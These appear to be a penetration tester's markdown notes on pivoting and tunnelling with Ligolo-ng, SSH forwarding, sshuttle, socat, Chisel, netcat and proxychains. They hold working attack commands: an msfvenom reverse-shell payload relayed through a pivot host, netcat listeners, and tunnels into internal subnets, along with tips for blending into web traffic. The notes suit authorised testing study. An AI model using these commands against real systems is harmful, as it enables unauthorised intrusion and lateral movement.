
**Ligolo-ng** 

 allows pentesters to establish tunnels from a reverse TCP/TLS connection using a **tun interface**

install  proxy
https://github.com/nicocha30/ligolo-ng/releases

```sh
sudo ip tuntap add user kali mode tun ligolo

sudo ip link set ligolo up



#80 and 443 are excellent choices because they are commonly allowed by firewalls and appear less suspicious due to their frequent use in legitimate web traffic
./proxy -selfcert -laddr 0.0.0.0:<proxy_port>
```

use for the Client 
https://github.com/nicocha30/ligolo-ng/releases


```sh
./agent.exe -connect <attacker_IP>:<ligolo_port> -retry -ignore-cert

#routing setup
#Represents the subnet of the internal network you want to route traffic 10.10.10.0/24
sudo ip route add <internal_subnet> dev ligolo

#select session
session <session_ID>
#starting the session as the user we set the agent.exe for 
start
```

Port Forwarding 

```sh
 #list all the address that port forwarded
listener_list

#redirect  conncetion from agent to kali
listener_add --addr 0.0.0.0:1235 --to locahost:80


############################################################3
we can use this as file transfer from kali we open python server on port 80 and on lets say ms2 is linked to ms1 which is central point between them we use port 1235 to connect or curl from  ms2 we can download upload data using http://ms1:1235/ that we will take data from kali

#scenario 2

listener_add --addr 0.0.0.0:4444 --to locahost:443

msfvenom  -p windows/x64/shell_reverse_tcp LHOST=ms1 LPORT=4444 -f exe -o winrev444.exe 

upload it to ms2

now on kali  run nc -lvnp 443

we now have a reverse shell connected from ms2 to our kali passing / forwarding it though ms1
 
```
**SSH Port Forwarding**

Local Port Forwarding 
```sh
#forwards port from target to local
ssh -L <local_port>:<target_host>:<target_port> <user>@<ip>
```

Dynamic Port Forwarding
```sh
#Dynamic port forwarding: it creates a SOCKS proxy any port you want dynamically through the proxy.
ssh <user>@<ip> -D <ProxyPort>
#ProxyPort is the local port on our machine where the SOCKS proxy will listen.
#lets say we chose port 8888 we can use burp to connect to port 8888 socks proxy to dynamically  fetch  ports and redirect traffic 

``` 

Remote Port Forwarding
```sh
#Make a local service accessible from the compromised host.
ssh -R [remote_port]:[local_host]:[local_port] user@ssh_server
```

 **Sshuttle**

Transparent proxy over SSH 
```sh
#Works like a VPN over SSH.
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 

sshuttle -r root@10.200.98.200 --ssh-cmd "ssh -i key.rsa" 10.200.98.0/24 -x 10.200.98.200 &
```


 **SOCAT**

Port forward from machine to external netwrok
```sh
wget http://precompiled/socat -O /tmp/socat
chmod +x /tmp/socat

#forward from victim port 8000 to external network
socat tcp-l:2345,fork tcp:127.0.0.1:8000 &

#not victim IP + port 2345 is exporsed to external networks


```

**Chisel**

TCP/UDP port forwarding tool over HTTP or HTTPS


```sh
#it can Maps REMOTE port to LOCAL port
# On remote server listening to port 8000
chisel server -p 8000 --reverse

# This forwards local port 1433 to port 9000 on public server

#connect to server public on port 8000 forward anthing from public_server "localhost" 9000 to victim 1433 on the "victim localhost"
./chisel client <public_server>:8000 R:9000:127.0.0.1:1433


#Scenario 
#attacker
./chisel server --port 8000 --reverse

#ligolo  --to 127.0.0.1:8000 ot attacker IP since the traffic will be send to localhost ms1 and localhost attacker
listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:8000

#victim R:localhost so attacker can do @localhost to connect to victim 1433 R:<bind_on_server>:<connect_to_from_client>
./chisel.exe client <pc_ligolo>:8888 R:localhost:127.0.0.1:1433

```


![[Pasted image 20260122123516.png]]
```sh
#SOCKS5

chisel server  --socks5 --reverse

#copy fingerpring from the server  and the listening port
#R for reverse tunnel meaning victim connect to attacker
chisel client --fingerprint <fingerprint> <ipserver>:<listeningport> R:<attackerPort>:<target>:<targetport>

# attacker should access from localhost on port 8000 the data from victim port 80 which is http service
chisel client --fingerprint <fingerprint> 172.19.254.6:8080 R:8000:10.10.2.5:80 

#OR using socks proxy 
#we need to configure proxychains4.conf
chisel client --fingerprint <fingerprint> 172.19.254.6:8080 R:socks 


# this meanign anything that goes to 0.0.0.0:9999 mapit out and bound it to 172.19.254.6:9999 
chisel client --fingerprint <fingerprint> 172.19.254.6:8080 0.0.0.0:9999:172.19.254.6:9999

#now if need the windows machinne 10.1.2.6 to connect back to the attacker we can by generetaing a rev shell from .6 to .4 since now .4 has a forward any from 9999 to attacker port 9999
```

 **NC**

```sh

# Forward  port (8000) to your attacker machine
#victim
mkfifo /tmp/jdwp_fifo

nc -l -p 9000 < /tmp/jdwp_fifo | nc 127.0.0.1 8000 > /tmp/jdwp_fifo &

#attacker
nc -lvnp 1234

```


**ProxyChains**
Force TCP connections through a proxy.

```sh
#Configure /etc/proxychains4.conf
socks4 127.0.0.1 1080

#Usage
proxychains nmap -sT -p 22,80,443 target_internal_ip
```
### References 

https://github.com/nicocha30/ligolo-ng/releases
https://www.youtube.com/watch?v=pbR_BNSOaMk